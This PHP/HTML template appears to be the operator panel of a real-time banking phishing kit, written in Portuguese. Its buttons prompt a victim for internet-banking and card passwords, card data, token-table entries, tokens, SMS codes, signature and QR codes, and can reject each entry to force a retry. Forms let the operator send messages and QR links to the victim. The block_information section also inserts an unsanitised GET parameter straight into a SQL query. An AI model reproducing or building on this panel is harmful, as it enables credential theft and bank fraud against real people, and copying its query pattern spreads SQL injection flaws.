<div class="block_commands" style="display:<?php echo $ManageFisica;?>">

	<div class="block_erros_commands">
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_acesso">ACESSO X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_psn">SENHA NET X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_pscc" class="last">SENHA CC X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_cc">CARTÃO X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_table">TABELA X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_tks" class="last">TOKEN X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_phone">TELEFONE X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_ass">ASSINATURA X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_sms" class="last">SMS X</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=finalizar" class="finaliza_user"><i class="fa fa-close"></i> &nbsp;FINALIZA</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_qrcode" style="background-color:#05876a;color:#fff;">QRCODE</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=inv_qrcode" class="last" style="background-color:#c4fcf0;">QRCODE X</a>
	</div><!-- block_erros_commands -->

	<div class="clear"></div>
	<hr>
	<div class="clear"></div>

	<div class="block_get_commands">
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_table">TABELA</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_pscc">SENHA CC</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_cc" class="last">CARTÃO</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_tks_fisica">TOKEN</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=send_message_fisica" class="anotacao_user"><i class="fa fa-get-pocket"></i> &nbsp;MENSAGEM</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_phone" class="last">TELEFONE</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_ass">ASSINATURA</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_sms">SMS</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_caixa" class="last">CAIXA</a>
		<a href="?gerenciar_fisi=<?php echo $SendIdUser;?>&send=get_apelido">APELIDO</a>
	</div><!-- block_get_commands -->

	<div class="clear"></div>

	<div class="block_aditions">

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendName;?>;" id="FormName">
			<label for="send_name">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_name" name="send_name" placeholder="Nome do usuário" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormName').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendPos;?>;" id="FormPos">
			<label for="send_pos_table">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_pos_table" name="send_pos_table" placeholder="Posição requerida" class="normal_input" maxlength="2" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormPos').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendNota;?>;" id="FormNota">
			<label for="send_nota">
				<span class="star_span"><i class="fa fa-user"></i></span>
				<input type="text" id="send_nota" name="send_nota" placeholder="Anotação" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormNota').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendMensagemF;?>;" id="FormNotaMsF">
			<label for="send_ref">
				<span class="star_span"><i class="fa fa-key"></i></span>
				<input type="text" id="send_mensagem_fisica" name="send_mensagem_fisica" placeholder="Mensagem ao usuário" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormNotaMsF').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

		<form action="acesso.php" method="post" style="display:<?php echo $displaySendQrCodeF;?>;" id="FormQrCodeF">
			<label for="send_ref">
				<span class="star_span"><i class="fa fa-key"></i></span>
				<input type="text" id="send_qrlink" name="send_qrlink" placeholder="Link imagem QrCode" class="normal_input" autocomplete="off">
				<input type="hidden" name="send_id_user" value="<?php echo $SendIdUser;?>">
				<span class="final_span" onclick="document.getElementById('FormQrCodeF').submit();"><i class="fa fa-send"></i></span>
			</label>
		</form>

	</div><!-- block_aditions -->

	<div class="clear"></div>

	<div class="block_information">
		<?php

			$UsuarioGet = $_GET['gerenciar_fisi'];

			$tabela = 'acessos';
			$cond = "WHERE id = '$UsuarioGet'";
			$GetInfos = read($conn, $tabela, $cond);

		?>
		<span>Tabela completa: <b><?php echo ($GetInfos[0]['tabela_full'] == 1) ? 'Sim' : 'Não';?></b></span>
		<span class="last">CC FULL: <b><?php echo ($GetInfos[0]['cc_full'] == 1) ? 'Sim' : 'Não';?></span>
	</div><!-- block_information -->

	<div class="clear"></div>

	<a href="acesso.php" class="btn_close_now"><i class="fa fa-window-close"></i> &nbsp;FECHAR</a>

</div><!-- block_commands -->
